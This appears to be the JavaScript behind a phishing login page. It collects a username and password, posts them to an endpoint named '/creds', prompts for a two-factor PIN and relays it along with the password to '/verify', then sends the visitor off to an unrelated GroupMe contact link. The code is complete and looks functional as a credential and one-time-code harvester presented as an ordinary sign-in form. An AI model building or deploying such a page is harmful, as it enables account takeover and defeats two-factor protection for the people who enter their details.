let visibleModal = null;
let rememberMe;

let uname;
let pass;
let verify_token;

async function submits() {
    const incorrectText = document.getElementById("incorrect-password");
    incorrectText.style.display = "none";

    const passwordBox = document.getElementById("password");
    passwordBox.setAttribute("aria-invalid", "");

    const submitButton = document.getElementById("submit-button");
    submitButton.setAttribute("aria-busy", "true");
    submitButton.textContent = "Authenticating...";

    const form = document.getElementById("login-form");

    rememberMe = form.elements.remember.checked;
    uname = form.elements.username.value;
    pass = form.elements.password.value;

    let res = await fetch('/creds', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ "pword": pass, "uname": uname }),
    });

    res = await res.json();

    console.log(res);

    if (res.response === "INVALID") {
        submitButton.setAttribute("aria-busy", "false");
        submitButton.textContent = "Authenticate";
        rejectSubmit();
        return;
    } else if (res.response === "VERIFY") {
        verify_token = res.code;
        openModal(document.getElementById('verify-modal'));
    } else if (res.response === "OK") {
        window.location.replace("https://groupme.com/contact/116121837/IGs6jOkA");
    }
}

async function verify() {
    const verifyButton = document.getElementById("submit-button");
    verifyButton.setAttribute("aria-busy", "true");
    verifyButton.textContent = "Verifying...";

    const form = document.getElementById("verify-form");

    let res = await fetch('/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ "pword": pass, "uname": uname, "verification_token": verify_token, "code": form.elements.pin.value}),
    });

    res = await res.json();

    if (res.response === "OK") {
        verifyButton.setAttribute("aria-busy", "false");
        verifyButton.textContent = "Verify";
        closeModal(document.getElementById('verify-modal'));
        window.location.replace("https://groupme.com/contact/116121837/IGs6jOkA");
    } else if (res.response === "INVALID-PIN") {
        verifyButton.setAttribute("aria-busy", "false");
        verifyButton.textContent = "Verify";

        const verifyBox = document.getElementById("verify-box");
        verifyBox.setAttribute("aria-invalid", "true");
        verifyBox.value = "";

        const incorrectText = document.getElementById("incorrect-verify");
        incorrectText.style.color = 'red';
        incorrectText.style.display = "block";
        if (res.attempts !== 1) {
            document.getElementById("incorrect-verify").textContent = `That pin is incorrect, try again. (${res.attempts} attempts remaining)`;
        } else {
            document.getElementById("incorrect-verify").textContent = `That pin is incorrect, try again. (${res.attempts} attempt remaining)`;
        }

    } else if (res.response === "INVALID") {
        closeModal(document.getElementById('verify-modal'));
        rejectSubmit();
    };
}

function rejectSubmit() {
    const incorrectText = document.getElementById("incorrect-password");
    incorrectText.style.color = 'red';
    incorrectText.style.display = "block";

    const passwordBox = document.getElementById("password");
    passwordBox.setAttribute("aria-invalid", "true");
    passwordBox.value = "";
    
    const submitButton = document.getElementById("submit-button");
    submitButton.setAttribute("aria-busy", "false");
    submitButton.textContent = "Authenticate";
}

function openModal(modal) {
    if (document.body.scrollHeight > screen.height) {
        document.documentElement.style.setProperty("--scrollbar-width", `${getScrollbarWidth()}px`);
    }
    document.documentElement.classList.add("modal-is-open", "modal-is-opening");
    setTimeout(() => {
        visibleModal = modal;
        document.documentElement.classList.remove("modal-is-opening");
    }, 400);
    modal.setAttribute("open", true);
};

function closeModal(modal) {
    visibleModal = null;
    document.documentElement.classList.add("modal-is-closing");
    setTimeout(() => {
        document.documentElement.classList.remove("modal-is-closing", "modal-is-open");
        document.documentElement.style.removeProperty("--scrollbar-width");
        modal.removeAttribute("open");
    }, 400);
};

document.addEventListener("click", (event) => {
    if (visibleModal != null) {
      const modalContent = visibleModal.querySelector("article");
      const isClickInside = modalContent.contains(event.target);
      !isClickInside && closeModal(visibleModal);

      const submitButton = document.getElementById("submit-button");
      submitButton.setAttribute("aria-busy", "false");
      submitButton.textContent = "Authenticate";
    }
});

